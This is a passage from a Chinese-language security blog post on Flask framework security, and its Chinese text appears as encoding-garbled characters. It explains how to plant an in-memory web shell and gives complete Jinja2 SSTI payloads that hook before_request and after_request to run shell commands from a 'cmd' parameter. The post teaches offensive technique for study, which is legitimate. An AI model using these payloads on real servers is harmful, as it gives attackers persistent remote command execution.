<p>ç„¶è€Œè¿™æ ·çš„å†™æ³•æœ‰ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè¢«å†…å­˜é©¬å‡½æ•°æ‹¦æˆªï¼Œè¿™å°±å¯¼è‡´ç¨‹åºæ­£å¸¸çš„åŠŸèƒ½å—åˆ°å½±å“ã€‚</p>
<p>ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å†…å­˜é©¬å‡½æ•°ä¸­åŠ ä¸€äº›åˆ¤æ–­ï¼Œå¦‚æœæ²¡æœ‰å‘½ä»¤å‚æ•°å°±è¿”å› <code>None</code> é¿å…å½±å“ç¨‹åºæ­£å¸¸åŠŸèƒ½ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span>: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(</span><br><span class="line">    <span class="string">&quot;global CmdResp;CmdResp=__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span></span><br><span class="line">) == <span class="literal">None</span> <span class="keyword">else</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure></div>

<p>å¯¹åº”çš„ SSTI payload å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None,[]).append(lambda:CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read()\&quot;)==None else None)&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è€Œ <code>after_request</code> ä¼šæ¥æ”¶ä¸€ä¸ªå“åº”å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œä¸”<strong>å¿…é¡»è¿”å›ä¸€ä¸ªå“åº”å¯¹è±¡</strong>ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦å°† <code>before_request</code> çš„é€»è¾‘ä¿®æ”¹æˆâ€œå¦‚æœæ²¡æœ‰å‘½ä»¤å‚æ•°åˆ™å°†å‡½æ•°å‚æ•°è¿”å›â€ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None,[]).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>after_request</code> æ³¨å†Œçš„å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ª<strong>å“åº”å¯¹è±¡</strong>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†å‘½ä»¤æ‰§è¡Œç»“æœç”¨ <code>flask.make_response</code> è½¬æ¢ä¸€ä¸‹ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š</p>
<blockquote>
<p>TypeError: â€˜strâ€™ object is not callable</p>
</blockquote>

    </div>
  </div>



<h4 id=""><a href="#" class="headerlink" title=""></a></h4>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Python å¸¸è§æ¡†æ¶å®‰å…¨</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-08-12 00:26:57</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-19 01:12:24
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/08/12/Python å¸¸è§æ¡†æ¶å®‰å…¨/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/python-web/">#python web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/08/18/%E5%9F%BA%E6%9C%AC%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">åŸºæœ¬æ±‡ç¼–å¼•æ“</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/12/Python%20%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Python æ²™ç®±é€ƒé€¸</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Python å¸¸è§æ¡†æ¶å®‰å…¨</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Flask"><span class="nav-text">Flask</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">ç¯å¢ƒæ­å»º</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%8E%E6%BF%80%E6%B4%BB-venv"><span class="nav-text">åˆ›å»ºä¸æ¿€æ´» .venv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-Flask"><span class="nav-text">å®‰è£… Flask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%87%E6%8D%A2-Flask-%E7%89%88%E6%9C%AC"><span class="nav-text">åˆ‡æ¢ Flask ç‰ˆæœ¬</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BA%E5%AE%9A%E4%BE%9D%E8%B5%96"><span class="nav-text">å›ºå®šä¾èµ–</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">åŸºç¡€çŸ¥è¯†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%AF%B9%E8%B1%A1%EF%BC%88Application-Object%EF%BC%89"><span class="nav-text">åº”ç”¨å¯¹è±¡ï¼ˆApplication Objectï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0%EF%BC%88View-Function%EF%BC%89"><span class="nav-text">è§†å›¾å‡½æ•°ï¼ˆView Functionï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%EF%BC%88Routing%EF%BC%89"><span class="nav-text">è·¯ç”±ï¼ˆRoutingï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%AF%B9%E8%B1%A1%EF%BC%88Request%EF%BC%89"><span class="nav-text">è¯·æ±‚å¯¹è±¡ï¼ˆRequestï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%8D%E5%BA%94%EF%BC%88Response%EF%BC%89"><span class="nav-text">å“åº”ï¼ˆResponseï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%EF%BC%88Template%EF%BC%89"><span class="nav-text">æ¨¡æ¿ï¼ˆTemplateï¼‰</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%8D%B1%E9%99%A9%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93%E5%87%BD%E6%95%B0"><span class="nav-text">ä½¿ç”¨å±é™©æ¨¡æ¿æ¸²æŸ“å‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTI"><span class="nav-text">SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask-%E6%A8%A1%E6%9D%BF%E6%94%AF%E6%8C%81"><span class="nav-text">Flask æ¨¡æ¿æ”¯æŒ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-text">æ¼æ´æˆå› </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="nav-text">æ¼æ´æ¢æµ‹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%8F%AF%E7%94%A8%E5%AF%B9%E8%B1%A1"><span class="nav-text">æ¢æµ‹å¯ç”¨å¯¹è±¡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-text">è¿‡æ»¤ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">é€šç”¨ç»•è¿‡æ–¹æ³•</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%9C%BA%E6%99%AF%E7%BB%95%E8%BF%87"><span class="nav-text">ç‰¹æ®Šåœºæ™¯ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6"><span class="nav-text">ç»•è¿‡ç‰¹å®šå­—ç¬¦</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%EF%BC%88%E6%96%B9%E6%8B%AC%E5%8F%B7%EF%BC%89"><span class="nav-text">ç»•è¿‡ []ï¼ˆæ–¹æ‹¬å·ï¼‰</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="nav-text">ç»•è¿‡åŒèŠ±æ‹¬å·</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97"><span class="nav-text">ç»•è¿‡æ•°å­—</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE"><span class="nav-text">ä¸å‡ºç½‘å›æ˜¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#debug-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99"><span class="nav-text">debug æ¨¡å¼ä¸‹åˆ©ç”¨æŠ¥é”™</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-HTTP-%E5%93%8D%E5%BA%94%E5%AD%97%E6%AE%B5"><span class="nav-text">åˆ©ç”¨ HTTP å“åº”å­—æ®µ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">å†…å­˜é©¬</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A7%E7%89%88%E6%9C%AC%EF%BC%88%E2%89%A4-2-1-3%EF%BC%89"><span class="nav-text">æ—§ç‰ˆæœ¬ï¼ˆâ‰¤ 2.1.3ï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%EF%BC%88%E2%89%A5-2-2-0%EF%BC%89"><span class="nav-text">æ–°ç‰ˆæœ¬ï¼ˆâ‰¥ 2.2.0ï¼‰</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E6%8A%A4%E5%88%86%E6%9E%90"><span class="nav-text">é˜²æŠ¤åˆ†æ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="nav-text">ç¯¡æ”¹è·¯ç”±è¡¨</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%AF%B7%E6%B1%82%E9%92%A9%E5%AD%90"><span class="nav-text">æ³¨å†Œè¯·æ±‚é’©å­</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1212.2k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>